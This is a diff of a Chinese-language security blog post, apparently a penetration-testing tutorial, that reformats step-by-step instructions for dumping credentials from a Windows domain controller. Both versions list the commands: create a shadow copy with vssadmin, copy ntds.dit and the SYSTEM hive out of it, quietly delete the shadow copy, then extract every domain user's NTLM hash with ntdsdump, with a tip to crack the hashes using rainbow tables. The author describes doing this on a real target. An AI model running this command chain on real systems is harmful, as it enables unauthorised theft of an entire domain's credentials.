@@ -130,40 +130,56 @@ ADC02=192.168.0.2（备份）
 <p>话不多说开撸：（由于目标不方便截图，本地环境复现）</p>
 </blockquote>
 <p>Hash一般存储在两个地方：SAM文件，存储在本机对应本地用户,NTDS.DIT文件，存储在域控上对应域用户。</p>
-<p>(1) 查看系统当前快照</p>
-<pre><code>vssadmin list shadows</code></pre><p>(创建快照-由于类似的方法和工具网上很多这里只提一下)</p>
-{% asset_img 1.png This is an example image %}
-<p>如果发现有快照，便可以通过快照查看该服务器的历史文件。</p>
-<p>(2) 创建快照</p>
-<pre><code>vssadmin create shadow /for=c:</code></pre><img src="/2019/08/21/tips1/2.png" title="This is an example image">
+<ol>
+<li>查看当前快照<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
 
-<p>获得Shadow Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</p>
-<p>(3) 复制ntds.dit</p>
-<pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</code></pre>{% asset_img 3.png This is an example image %}
+</li>
+</ol>
+<img src="/2019/08/21/tips1/1.png" title="This is an example image">
+<ol start="2">
+<li>创建快照<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
 
-<p>(4) 获取system.hiv</p>
-<pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\system.hiv
-或者
-reg save hklm\system C:\system.hiv</code></pre><img src="/2019/08/21/tips1/4.png" title="This is an example image">
+</li>
+</ol>
+<img src="/2019/08/21/tips1/2.png" title="This is an example image">
+<ol start="3">
+<li>复制ntds.dit<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
 
-<p>(5)  删除快照</p>
-<pre><code>vssadmin delete shadows /for=c: /quiet</code></pre>{% asset_img 5.png This is an example image %}
+</li>
+</ol>
+<img src="/2019/08/21/tips1/3.png" title="This is an example image">
+<ol start="4">
+<li>复制system.hiv<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\system.hiv</span><br></pre></td></tr></table></figure>
 
-<p>(6) 导出NTDS.dit 和 system.hiv 文件到本地提取hash<br>Tools url:  <a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html</a></p>
-<p><a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">tool_url</a><br>我喜欢用ntdsdump.exe 这个工具，简单方便。</p>
-{% asset_img 6.png This is an example image %}
+</li>
+</ol>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\system.hiv</span><br></pre></td></tr></table></figure>
 
-<p>如果目标内用户数量很大的话那么就不推荐大家把这两个文件下载回本地了可以上传工具直接在目标机器上提取 然后导出含有hash的txt文件就好。<br>    <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC]</span><br></pre></td></tr></table></figure></p>
-<pre><code>但是第一次运行会可能会遇到下面的问题。</code></pre><img src="/2019/08/21/tips1/7.png" title="This is an example image">
-<p>不要慌张~<br>输入==esentutl /p /o ntds.dit== 就可以修复。</p>
+<img src="/2019/08/21/tips1/4.png" title="This is an example image">
+<ol start="5">
+<li>删除快照<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<img src="/2019/08/21/tips1/5.png" title="This is an example image">
+<ol start="6">
+<li>导出hash<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC]</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>这里可以根据目标的情况来选择合适的方法，如果文件过大，可以把工具传到服务器上使用，反之可以把文件下载到本地解密。<br>我使用的是<a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">ntdsdump</a>这个工具，简单方便。</p>
+<img src="/2019/08/21/tips1/6.png" title="This is an example image">
+
+<p>第一次使用会出现下面这个问题</p>
+<img src="/2019/08/21/tips1/7.png" title="This is an example image">
+<p>不要慌张~<br>输入</p>
+<pre><code>esentutl /p /o ntds.dit</code></pre><p>就可以修复。</p>
 <img src="/2019/08/21/tips1/8.png" title="This is an example image">
 <p>然后在运行上一条命令就ok啦。</p>
 <img src="/2019/08/21/tips1/9.png" title="This is an example image">
 <p>这样就获取到了当前域所有用户的账号和NTLM hash了。解密的话推荐使用彩虹表。</p>
 <img src="/2019/08/21/tips1/10.png" title="This is an example image">
-
-
-
 
 
 
